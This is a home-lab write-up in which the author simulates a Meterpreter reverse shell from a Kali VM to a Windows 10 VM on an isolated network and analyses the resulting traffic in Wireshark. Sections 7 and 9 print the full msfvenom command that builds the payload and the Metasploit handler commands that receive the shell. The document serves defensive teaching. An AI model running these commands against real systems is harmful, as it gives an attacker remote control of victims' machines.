# 🔬 Home Lab: Analysing Malicious Traffic with Wireshark

## 🎯 Objective

To simulate a reverse shell attack from a Kali Linux attacker machine to a Windows 10 victim machine and capture the network traffic using Wireshark for analysis. This was done in a closed, isolated environment without internet access to make sure network traffic is contained within the virtual environment to prevent any external risk.

## 🌟 Table of Contents 🌟

- [🛠️ Lab Setup Overview](#lab-setup-overview)
- [🧱 Lab Environment Configuration](#-lab-environment-configuration)
  - [1. Virtual Machine Setup](#1-virtual-machine-setup)
  - [2. Network Configuration (Host-Only Isolation)](#2-network-configuration-host-only-isolation)
  - [3. VM Boot and Connectivity Test](#3-vm-boot-and-connectivity-test)
  - [4. Hosting a Local HTTP Server on Kali](#4-hosting-a-local-http-server-on-kali)
  - [5. Transferring Wireshark Installer to Windows VM](#5-transferring-wireshark-installer-to-windows-vm)
  - [6. Wireshark Installation and Packet Capture Setup](#6-wireshark-installation-and-packet-capture-setup)
  - [7. Creating a Reverse Shell Payload with msfvenom](#7-creating-a-reverse-shell-payload-with-msfvenom)
  - [8. Delivering the Payload to Windows VM](#8-delivering-the-payload-to-windows-vm)
  - [9. Configuring Metasploit Listener on Kali](#9-configuring-metasploit-listener-on-kali)
  - [10. Executing Payload and Capturing Network Traffic](#10-executing-payload-and-capturing-network-traffic)
- [🔎 11. Network Traffic Analysis in Wireshark](#-11-network-traffic-analysis-in-wireshark)
  - [11.1 Observing Initial Traffic Patterns](#111-observing-initial-traffic-patterns)
  - [11.2 Isolating Traffic on Port 4444](#112-isolating-traffic-on-port-4444)
  - [11.3 Verifying the Protocol Used](#113-verifying-the-protocol-used)
  - [11.4 Examining the TCP Stream for Indicators](#114-examining-the-tcp-stream-for-indicators)
  - [11.5 Confirming Session Initiation via TCP Handshake](#115-confirming-session-initiation-via-tcp-handshake)
  - [11.6 Checking for DNS Activity](#116-checking-for-dns-activity)
  - [11.7 Analysing Data Flow and Connection Stability](#117-analysing-data-flow-and-connection-stability)
- [📊 12. Key Findings from Traffic Analysis](#-12-key-findings-from-traffic-analysis)
- [🚨 13. Indicators of Compromise (IOCs)](#-13-indicators-of-compromise-iocs)
- [📋 14. Investigation Summary and Conclusions](#-14-investigation-summary-and-conclusions)
- [🛡️ 15. Proposed Mitigations](#15-proposed-mitigations)
- [📅 16. Limitations and Next Steps](#-16-limitations-and-next-steps)

<a id="lab-setup-overview"></a>
## 🛠️ Lab Setup Overview

| Component | Description                  |
|-----------|------------------------------|
| 💻 Host   | Windows 10 with VMware Workstation |
| 🐍 Attacker | Kali Linux VM **(172.16.0.129)**               |
| 🤕 Victim | Windows 10 VM **(172.16.0.128)**                |
| 🌐 Network | Host-Only **(no internet access, local traffic only)**       |


## 🧱 Lab Environment Configuration

### 1. Virtual Machine Setup

•	Kali Linux VM: Already installed.<br>
•	Windows 10 VM: Installed a fresh version from ISO.

<img src="https://i.imgur.com/cwLyuhg.png">

---

### 2. Network Configuration (Host-Only Isolation)

In VMware:

•	Set both VMs’ network adapters to Host-Only mode to isolate traffic from the internet.<br>
•	This allows both VMs to communicate internally but have no internet access.<br>

<img src="https://i.imgur.com/lKX8ERX.png">

I configured both the Kali Linux and Windows 10 VMs to use the Host-Only network adapter in VMware. This ensured that both machines could communicate directly with each other, while remaining completely isolated from the internet. This is important for simulating malware behaviour in a safe and controlled environment.

---

### 3. VM Boot and Connectivity Test

<img src="https://i.imgur.com/4S067Cf.png">

<img src="https://i.imgur.com/oG3dX2C.png">

To confirm connectivity, I used ```ip a``` on Kali to find its IP address (172.16.0.129) and successfully pinged it from the Windows 10 VM.

---

### 4. Hosting a Local HTTP Server on Kali

Since both machines had no internet, I needed to install Wireshark on the Windows 10 VM manually. 
I already had the Wireshark installer on Kali.

<img src="https://i.imgur.com/VWJpCcK.png">

On Kali, I started a simple HTTP server from the directory containing the installer:

```
python3 -m http.server 8080
```

---

### 5. Transferring Wireshark Installer to Windows VM

I had to temporarily disable the Kali firewall (using ```sudo ufw disable```) to allow the Windows VM to reach the HTTP server. After the transfer, I re-enabled it with ```sudo ufw enable``` to keep things secure.

<img src="https://i.imgur.com/MOGYV3O.png">

In Windows 10, I opened Edge and visited http://172.16.0.129:8080/ to connect to the Kali machine, which allowed me to download the Wireshark.exe installer directly from Kali VM.

<img src="https://i.imgur.com/vwaqCmn.png">

---

### 6. Wireshark Installation and Packet Capture Setup

Once Wireshark was downloaded to the Windows 10 VM, I installed it and verified that it was able to capture traffic on the Host-Only adapter. I ensured the network interface being monitored matched the one used for host-only traffic.

<img src="https://i.imgur.com/yOIEbEC.png">

---

### 7. Creating a Reverse Shell Payload with msfvenom

Next, I generated a malicious payload using ```msfvenom```, a tool within the Metasploit Framework. This tool creates payloads that simulate malware, in this case, a reverse shell:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.0.129 LPORT=4444 -f exe -o /home/kali/Desktop/shell.exe
```

<img src="https://i.imgur.com/CxAbJGG.png">

**LHOST:** is Kali’s IP address (attacker).<br>
**LPORT 4444:** is the port Metasploit listens on.<br>
**-f exe:** creates a Windows executable payload.<br>
**-o:** sets the output path.<br>

---

### 8. Delivering the Payload to Windows VM

I then used the same HTTP server method to transfer ```shell.exe``` to the Windows 10 VM.

<img src="https://i.imgur.com/SWYDjpi.png">

In real-world scenarios, malware like this is typically delivered to a victim's system via methods such as phishing or exploitation of vulnerabilities. For the purposes of this isolated home lab, the payload was transferred directly to simplify the simulation.

---

### 9. Configuring Metasploit Listener on Kali

Before running the malicious payload, I opened Metasploit on Kali:

```
Msfconsole
```

Then set up a handler to receive the reverse shell:

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.0.129
set LPORT 4444
run
```

<img src="https://i.imgur.com/O7HFP8m.png">

This opened a listener on port 4444, waiting for an incoming connection from the victim machine.

---

### 10. Executing Payload and Capturing Network Traffic

I launched Wireshark on the Windows 10 VM and started capturing packets on the Host-Only interface. While capturing, I executed shell.exe.

<img src="https://i.imgur.com/2xV8FUe.png">

Within seconds, I observed an outbound connection from Windows to Kali on port 4444. On Kali, the Metasploit listener received the connection, and I gained a Meterpreter session — a simulated “hacker shell” on the victim system.

<img src="https://i.imgur.com/9N2dU3K.png">

---

## 🔎 11. Network Traffic Analysis in Wireshark

Once the session was established and Wireshark captured the traffic, I began analysing it like a real-world SOC analyst would when reverse shell behaviour is suspected.

---

### 11.1 Observing Initial Traffic Patterns

<img src="https://i.imgur.com/lYdKC5F.png">
After running the shell.exe file, I noticed new traffic appear in Wireshark. Checking the packets, I saw they all came from the same source IP, 172.16.0.129 (the attacker), and used port 4444 consistently.

---

### 11.2 Isolating Traffic on Port 4444

<img src="https://i.imgur.com/4HSIHyA.png">
To zero in on this traffic, I applied a Wireshark filter for port 4444, which isolated the relevant packets. Out of 695 total packets captured, 429 were linked to port 4444, suggesting this port’s activity was unusual and possibly malicious.

---

### 11.3 Verifying the Protocol Used

<img src="https://i.imgur.com/9WvaopB.png">
The traffic used TCP, a reliable protocol suited for reverse shells due to its stable connection. I confirmed this by checking the Protocol field in the filtered packets, indicating a persistent connection typical of such activity.

---

### 11.4 Examining the TCP Stream for Indicators

<img src="https://i.imgur.com/tPc1w0B.png">
I monitored network traffic between 172.16.0.128 (the victim) and 172.16.0.129 (the attacker) using Wireshark’s "Follow TCP Stream" feature. The stream showed unreadable binary data mixed with an error message, "This program cannot be run in DOS mode," hinting that a Windows program was running on 172.16.0.128 (the victim). The traffic started from 172.16.0.129 (the attacker) on port 4444, a port often tied to remote access, with 494 bytes transferred in 121 milliseconds. This suggests the program on 172.16.0.128 (the victim) was sending data back to 172.16.0.129 (the attacker), pointing to a potential reverse shell setup.

---

### 11.5 Confirming Session Initiation via TCP Handshake

I looked at the initial packets for signs of a TCP handshake, key to setting up a reverse shell. I focused on packets with SYN (synchronize) flags, which mark the start of a connection.

<img src="https://i.imgur.com/gJNGe0K.png">
The first packets showed SYN flags, starting the handshake. Since the SYN came from 172.16.0.128 (the victim) to 172.16.0.129 (the attacker), it confirmed the victim initiated the connection, one of the telltale signs of a reverse shell, proving an active link from the victim to the attacker.

---

### 11.6 Checking for DNS Activity

To check if DNS was involved (another connection method), I looked for any DNS requests in the traffic.

<img src="https://i.imgur.com/EgRJ0Nx.png">
No DNS queries were linked to 172.16.0.129 (the attacker), indicating the connection relied on a direct IP address, consistent with a reverse shell setup.

---

### 11.7 Analysing Data Flow and Connection Stability

To better track the data flow, I changed Wireshark’s timestamp to show Date and Time of Day instead of relative time, making the packet data clearer.

<img src="https://i.imgur.com/0HDdKVK.png">
Packets arrived every 1-2 seconds, showing a steady pattern. The presence of ACK and PSH flags confirmed active data exchange, typical for reverse shell traffic, with no big gaps suggesting a stable connection between 172.16.0.128 (the victim) and 172.16.0.129 (the attacker).

<img src="https://i.imgur.com/FMVolk8.png">

---

### 📊 12. Key Findings from Traffic Analysis

Based on packet analysis, timing correlation, port usage, and the nature of the traffic, I confirmed that the reverse shell was:

•	Initiated by the victim.<br>
•	Connected directly to the attacker's IP.<br>
•	Used a persistent, encoded TCP stream.<br>
•	Did not use DNS or standard protocols.<br>

**Note on Port Usage**: I used port 4444 for the reverse shell since it’s the Metasploit default and works well for learning. In real attacks, hackers often pick ports like 80 or 443 to hide in normal web traffic and avoid detection. Port 4444 did the job here, but I could look into sneakier methods for future labs.

---

### 🚨 13. Indicators of Compromise (IOCs)

| IOC               | Description                                  |
|-------------------|----------------------------------------------|
| 172.16.0.129      | Attacker IP (my Kali machine)                |
| TCP 4444          | Custom C2 port I used for the Meterpreter session |
| shell.exe         | Malicious payload I ran on the Windows VM    |
| No DNS resolution | Direct connection to IP, no domain lookups   |
| Long-lived TCP session | Hints at a C2 connection staying active |
| High-entropy TCP stream | Shows the Meterpreter payload doing its thing |

---

### 📋 14. Investigation Summary and Conclusions


In this investigation, I observed suspicious traffic between my Kali Linux VM (attacker) and Windows 10 VM (victim), which led me to suspect the presence of a reverse shell. I began by examining packets on port 4444, which is a commonly used port for reverse shell payloads, particularly in tools like Metasploit. However, the mere presence of traffic on this port doesn't automatically confirm that it’s a reverse shell, as other types of communication could also occur on this port.

To further investigate, I analysed the packet flow and identified patterns of communication originating from the Kali VM, which was consistent with the behaviour of a reverse shell connection. I verified the data flow by examining the timing and consistency of packets to ensure the connection was stable and ongoing, as would be expected with an active reverse shell.

Although the data in the TCP stream was encrypted and in binary form, making it unreadable, the consistent communication pattern and specific use of port 4444 strongly indicated the possibility of a reverse shell. Ultimately, I concluded that the traffic was highly likely to be related to a reverse shell based on the evidence of sustained, directed communication between the attacker and the victim, the established TCP connection, and the common use of port 4444 by reverse shell payloads.

---

<a id="15-proposed-mitigations"></a>
### 🛡️ 15. Proposed Mitigations

Since the Wireshark analysis suggests a possible reverse shell (based on port 4444 traffic, victim-initiated connection, and data exchange) but lacks definitive proof or the exact file involved, here’s how I would mitigate the risk: 

- Use an EDR tool to watch for processes making unexpected outbound connections, especially to port 4444, to identify the unknown file causing this behavior.

- Configure firewalls to block non-standard ports like 4444 for outbound traffic, reducing the chance of undetected remote access.

- Check 172.16.0.128 for recently executed files or processes around the time of the traffic (using logs or EDR), to pinpoint the source of the connection.

- If similar traffic is detected, isolate 172.16.0.128, scan for malware, and review logs to trace the file and assess damage.

---

### 📅 16. Limitations and Next Steps

This lab was a good way to figure out reverse shells and Wireshark, but I know I simplified some stuff to get it running:

- **How I Moved the Payload**: I used a local HTTP server on Kali to transfer `shell.exe` to the Windows VM since there was no internet. In real attacks, hackers usually trick people with phishing emails or exploits, so I could try that next time to make it more realistic.

- **Port 4444**: I picked port 4444 because it’s the default for Metasploit and easy for learning. But real hackers often use ports like 80 or 443 to blend in with normal web traffic, so I want to try those in a future lab.

- **What I Looked At**: I mostly focused on the network traffic with Wireshark. I could dig deeper by checking stuff like Windows Event Logs on the victim VM to see what `shell.exe` did there, or maybe use tools like Snort to spot the attack another way.
